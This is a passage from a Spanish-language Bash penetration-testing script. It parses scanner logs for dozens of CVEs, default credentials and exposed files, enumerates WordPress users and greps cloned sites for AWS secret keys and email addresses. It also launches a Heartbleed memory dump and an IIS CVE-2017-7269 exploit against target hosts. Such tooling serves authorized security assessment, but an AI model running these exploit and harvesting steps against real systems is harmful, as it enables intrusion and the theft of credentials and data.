			[ ! -e ".vulnerabilidades2/${host}_${port}_divulgacionInformacion.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt >> .vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null
			
			[ ! -e ".vulnerabilidades2/"$host"_zabbix_passwordDefecto.txt" ] && grep -i 'Password encontrado' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"passwordDefecto.txt >> .vulnerabilidades/"$host"_zabbix_passwordDefecto.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_passwordDefecto.txt" ] && grep -i 'valid credentials' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"passwordDefecto.txt 2>/dev/null | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_passwordDefecto.txt

			
			[ ! -e ".vulnerabilidades2/${host}_${port}_configuracionInseguraYii.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"yiiTest.txt >> .vulnerabilidades/"$host"_"$port"_configuracionInseguraYii.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_backupweb.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"backupweb.txt >> .vulnerabilidades/"$host"_"$port"_backupweb.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_archivosDefecto.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosDefecto.txt >> .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_archivosPeligrosos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_openWebservice.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"openWebservice.txt >> .vulnerabilidades/"$host"_"$port"_openWebservice.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_webshell.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt >> .vulnerabilidades/"$host"_"$port"_webshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_configApache.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configApache.txt >> .vulnerabilidades/"$host"_"$port"_configApache.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_configIIS.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configIIS.txt >> .vulnerabilidades/"$host"_"$port"_configIIS.txt 2>/dev/null
			
			[ ! -e ".vulnerabilidades2/${host}_${port}_phpinfo.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"phpinfo.txt > .enumeracion/"$host"_"$port"_phpinfo.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_cms-registroHabilitado.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cms-registroHabilitado.txt >> .vulnerabilidades/"$host"_"$port"_cms-registroHabilitado.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_CVE~2024~24919.txt" ] && grep -i "vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~24919.txt >> .vulnerabilidades/"$host"_"$port"_CVE~2024~24919.txt 2>/dev/null

			[ ! -e ".vulnerabilidades2/${host}_${port}_HTTPsys.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_IISwebdavVulnerable.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_nmapHTTPvuln.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"nmapHTTPvuln.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_sapNetweaverLeak.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sapNetweaverLeak.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_sapNetweaverLeak.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_confTLS.txt" ] && grep -i --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"confTLS.txt 2>/dev/null | egrep -iv "Vulnerable a" | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_confTLS.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_vulTLS.txt" ] && grep -i --color=never "Certificado expirado" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"vulTLS.txt 2>/dev/null | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt && grep -i --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"vulTLS.txt 2>/dev/null | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_sap~scan.txt" ] && egrep --color=never "200|vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"sap~scan.txt >> .vulnerabilidades/"$host"_"$port"_sap~scan.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_citrixVul.txt" ] && egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"citrixVul.txt 2>/dev/null | grep -vi 'error' >> .vulnerabilidades/"$host"_"$port"_citrixVul.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}_CVE~2020~0688.txt" ] && egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2020~0688.txt >> .vulnerabilidades/"$host"_"$port"_CVE~2020~0688.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_apacheTraversal.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheTraversal.txt >> .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_bigIPVul.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"bigIPVul.txt >> .vulnerabilidades/"$host"_"$port"_bigIPVul.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_pulseVul.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"pulseVul.txt >> .vulnerabilidades/"$host"_"$port"_pulseVul.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_apacheStruts.txt" ] && egrep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheStruts.txt >> .vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_CVE~2021~41773.txt" ] && egrep uid logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2021~41773.txt >> .vulnerabilidades/"$host"_"$port"_CVE~2021~41773.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_CGIServlet.txt" ] && egrep 'WEB-INF' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt >> .vulnerabilidades/"$host"_"$port"_CGIServlet.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_proxynoshell.txt" ] && egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"proxynoshell.txt >> .vulnerabilidades/"$host"_"$port"_proxynoshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_proxyshell.txt" ] && egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"proxyshell.txt >> .vulnerabilidades/"$host"_"$port"_proxyshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_cve2020-3452.txt" ] && egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cve2020-3452.txt >> .vulnerabilidades/"$host"_"$port"_cve2020-3452.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_wordpressGhost.txt" ] && egrep '\[+\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressGhost.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_wordpress~CVE~2022~21661.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress~CVE~2022~21661.txt >> .vulnerabilidades/"$host"_"$port"_wordpress~CVE~2022~21661.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_xmlRpcHabilitado.txt" ] && grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"xmlRpcHabilitado.txt >> .vulnerabilidades/"$host"_"$port"_xmlRpcHabilitado.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_xml~rpc~login.txt" ] && grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"xml~rpc~login.txt >> .vulnerabilidades/"$host"_"$port"_xml~rpc~login.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_chamilo~CVE~2023~34960.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"chamilo~CVE~2023~34960.txt >> .vulnerabilidades/"$host"_"$port"_chamilo~CVE~2023~34960.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_apacheNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheNuclei.txt >> .vulnerabilidades/"$host"_"$port"_apacheNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_tomcatNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"tomcatNuclei.txt >> .vulnerabilidades/"$host"_"$port"_tomcatNuclei.txt 2>/dev/null
			
			[ ! -e ".vulnerabilidades2/${host}_${port}_joomlaNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomlaNuclei.txt >> .vulnerabilidades/"$host"_"$port"_joomlaNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_wordpressNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpressNuclei.txt >> .vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_drupalNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"drupalNuclei.txt >> .vulnerabilidades/"$host"_"$port"_drupalNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_yiiNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"yiiNuclei.txt >> .vulnerabilidades/"$host"_"$port"_yiiNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_laravelNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravelNuclei.txt >> .vulnerabilidades/"$host"_"$port"_laravelNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_magentoNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"magentoNuclei.txt >> .vulnerabilidades/"$host"_"$port"_magentoNuclei.txt 2>/dev/null


			[ ! -e ".vulnerabilidades2/${host}_${port}_qnap-CVE~2024~27130.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"qnap-CVE~2024~27130.txt >> .vulnerabilidades/"$host"_"$port"_qnap-CVE~2024~27130.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_crushFTP-CVE~2024~4040.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"crushFTP-CVE~2024~4040.txt >> .vulnerabilidades/"$host"_"$port"_crushFTP-CVE~2024~4040.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_dLinkNAS-CVE~2024~3273.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-CVE~2024~3273.txt >> .vulnerabilidades/"$host"_"$port"_dLinkNAS-CVE~2024~3273.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_wordpress~CVE~2024~1071.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress~CVE~2024~1071.txt >> .vulnerabilidades/"$host"_"$port"_wordpress~CVE~2024~1071.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_owncloud-CVE~2023~49103.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"owncloud-CVE~2023~49103.txt >> .vulnerabilidades/"$host"_"$port"_owncloud-CVE~2023~49103.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_paloAlto-CVE~2024~3400.txt" ] && grep -i uid logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"paloAlto-CVE~2024~3400.txt >> .vulnerabilidades/"$host"_"$port"_paloAlto-CVE~2024~3400.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_zimbra~CVE~2022~27925.txt" ] && grep '\+' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"zimbra~CVE~2022~27925.txt >> .vulnerabilidades/"$host"_"$port"_zimbra~CVE~2022~27925.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_zimbra-cve~2019~9670.txt" ] && grep -i "credenciales" logs/vulnerabilidades/"$host"_"$port"_zimbra-cve~2019~9670.txt >> .vulnerabilidades/"$host"_"$port"_zimbra-cve~2019~9670.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}_laravel-rce-CVE~2021~3129.txt" ] && grep root logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"laravel-rce-CVE~2021~3129.txt >> .vulnerabilidades/"$host"_"$port"_laravel-rce-CVE~2021~3129.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_CMSDesactualizado.txt" ] && egrep -v 'Couldnt|Running|juumla.sh|returned' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CMSDesactualizado.txt >> .vulnerabilidades/"$host"_"$port"_CMSDesactualizado.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_joomla-CVE~2023~23752.txt" ] && egrep 'DB|Site' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2023~23752.txt >> .vulnerabilidades/"$host"_"$port"_joomla-CVE~2023~23752.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_joomla-CVE~2017~8917.txt" ] && egrep -i 'found' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2017~8917.txt >> .vulnerabilidades/"$host"_"$port"_joomla-CVE~2017~8917.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_joomla-CVE~2018~17254.txt" ] && egrep -i '\+' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2018~17254.txt >> .vulnerabilidades/"$host"_"$port"_joomla-CVE~2018~17254.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_joomla-CVE-2023~23752.txt" ] && egrep -i '\+' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE-2023~23752.txt >> .vulnerabilidades/"$host"_"$port"_joomla-CVE-2023~23752.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_joomla-CVE~2015~7297.txt" ] && egrep -i '\+' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"joomla-CVE~2015~7297.txt >> .vulnerabilidades/"$host"_"$port"_joomla-CVE~2015~7297.txt 2>/dev/null
			
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_CVE~2024~28995.txt" ] && egrep -i '\+' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~28995.txt >> .vulnerabilidades/"$host"_"$port"_CVE~2024~28995.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_CVE~2024~31982.txt" ] && grep 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~31982.txt >> .vulnerabilidades/"$host"_"$port"_CVE~2024~31982.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port"_drupal-CVE~2018~7600.txt" ] && grep -i root logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"drupal-CVE~2018~7600.txt >> .vulnerabilidades/"$host"_"$port"_drupal-CVE~2018~7600.txt 2>/dev/null
			
			[ ! -e ".enumeracion2/"$host"_"$port"_company.txt" ] && cat logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"cert.txt 2>/dev/null | domain2company.py | egrep -iv 'Error en la entrada|linksys|wifi|akamai|asus|dynamic-m|whatsapp|test|ruckuswireless|realtek|fbcdn|googlevideo|nflxvideo|winandoffice|:|self-signed|Certificate|localhost|fortigate|Error' > .enumeracion/"$host"_"$port"_company.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}wpUsers.txt" ] && cat logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.json 2>/dev/null | wpscan-parser.py 2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.txt 2>/dev/null

			[ ! -e ".vulnerabilidades2/"$host"_"$port"_wordpress-cve~2017~5487.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wordpress-cve~2017~5487.txt >> .vulnerabilidades/"$host"_"$port"_wordpress-cve~2017~5487.txt 2>/dev/null
			cat .vulnerabilidades/"$host"_"$port"_wordpress-cve~2017~5487.txt 2>/dev/null | cut -d ':' -f2 >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.txt

			

			[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}CS-39.txt" ] && cp logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-39.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}CS-45.txt" ] && cp logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"testSSL.txt logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CS-45.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}confTLS.txt" ] && grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"confTLS.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}vulTLS.txt" ] && grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"vulTLS.txt 2>/dev/null
			
			[ ! -e "servicios/cgi.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosCGI.txt 2>/dev/null | awk '{print $3}' >> servicios/cgi.txt


			if [ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}configuracionInseguraWordpress.txt" ]; then
				#####wordpress
				grep '!' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt 2>/dev/null | egrep -vi 'identified|version|\+' | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> .vulnerabilidades/"$host"_"$port"_CMSDesactualizado.txt
				strings logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpscan.txt 2>/dev/null| grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configuracionInseguraWordpress.txt 2>/dev/null

				for username in `cat logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"wpUsers.txt|sort|uniq`
				do
					if [ "$VERBOSE" == '1' ]; then echo "probando si $username es valido"; fi
					respuesta=``
					validate-wordpress-user -url $proto_http://$host:$port/ -username "$username" > logs/enumeracion/"$username"_valid.txt
					sleep 2
					egrep -qi "no existe" logs/enumeracion/"$username"_valid.txt 2>/dev/null
					greprc=$? # $greprc -eq 0 --> no existe el usuario

					if [[ ( $greprc -eq 0 && ${username} == *"-"* && ! -z $DOMINIO )]];then
						username="${username//-/.}" # reemplazar - con .
						username="$username@$DOMINIO"
						username="${username//www./}"
						if [ "$VERBOSE" == '1' ]; then echo "probando si $username es valido"; fi
						validate-wordpress-user -url $proto_http://$host:$port/ -username "$username" > logs/enumeracion/"$username"_valid2.txt
						egrep -qi "no existe" logs/enumeracion/"$username"_valid2.txt 2>/dev/null
						greprc=$?
					fi

					if [[ $greprc -eq 1  ]] ; then #"no existe" no presente en log
						echo $username >> .vulnerabilidades/"$host"_"$port"_wpUsers.txt
					fi
				done #wp user
				############
			fi


			if [ ! -e ".vulnerabilidades2/"$host"_"$port"_heartbleedRAM.txt" ]; then
				#heartbleed
				egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"heartbleed.txt 2>/dev/null
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
					grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" >> .vulnerabilidades/"$host"_"$port"_heartbleed.txt
					$proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' >> .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt
					$proxychains heartbleed.sh $host $port &
				fi
			fi

			if [ ! -e "logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IIS-CVE~2017~7269.txt" ]; then
				#WebDAV
				egrep -i "200|207" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"httpmethods.txt 2>/dev/null| grep -iq 'PROPFIND'
				greprc=$?
				if [[ $greprc -eq 0  ]];then
					if [[ $VERBOSE -eq 's'  ]];then echo "Metodo PROPFIND DETECTADO"; fi
					if [[ "$port" != "80" && "$port" != '443' ]];then
						davtest -url $proto_http://$host:$port >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webdav.txt &
					else
						davtest -url $proto_http://$host >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webdav.txt &
					fi
					#exploit cadaver

					grep -i IIS logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0  ]];then
						iis-cve-2017-7269.py -t $proto_http://$host:$port> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"IIS-CVE~2017~7269.txt &
					fi
					# https://www.exploit-db.com/exploits/41992/
				fi
			fi
		done #for hosts
	done # for web.txt
	########

	if [ "$MODE" == "total" ] && [ ! -z $DOMINIO ]; then
		echo -e "[+] Extraer metadatos de sitios clonados (DOMINIO= $DOMINIO)"
		exiftool archivos/$DOMINIO/ > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null
		egrep -i "Author|creator|modified" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | cut -d ":" -f2 | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null

		##### Reporte metadatos (sitio web) ##
		# sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
		# echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
		# for nombretotal in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null`; do
		# #echo "nombretotal $nombretotal"
		# 	if [[ ${nombretotal} == *"-"*  ]];then
		# 		nombre=`echo $nombretotal | cut -f1 -d "-"`
		# 		apellido=`echo $nombretotal | cut -f2 -d "-"`
		# 		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv
		# 	fi
		# done
		################

		#  Eliminar URLs repetidas (clonacion)
		echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"
		sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt


		# filtrar error de conexion a base de datos y otros errores
		egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webTrack/$DOMINIO/* 2>/dev/null| sed 's/webTrack\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt

		# correos presentes en los sitios web
		grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webTrack/$DOMINIO/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" | grep $DOMINIO |  sort |uniq  >> logs/enumeracion/"$DOMINIO"_web_correos.txt
		cat  logs/enumeracion/"$DOMINIO"_correos_recon.txt .enumeracion2/*_correos_recon.txt 2>/dev/null | grep "$DOMINIO" | sed 's/x22//' |  sed 's/x2//' |  sort |uniq  > .enumeracion/"$DOMINIO"_consolidado_correos.txt

		egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webTrack/$DOMINIO/* >> .vulnerabilidades/"$DOMINIO"_aws_secrets.txt

		echo -e "[+] Buscar datos sensible en archivos clonados"
		#echo "cd webTrack/$DOMINIO"
		cd webClone/$DOMINIO
			### replace "space" for "-"
			for dir in *; do
				new_name=$(echo "$dir" | sed 's/ /-/g' | sed 'y/óÓ/oO/' | sed 'y/éÉ/eE/' | sed 'y/áÁ/aA/')
				mv "$dir" "$new_name" 2>/dev/null
			done
			##############

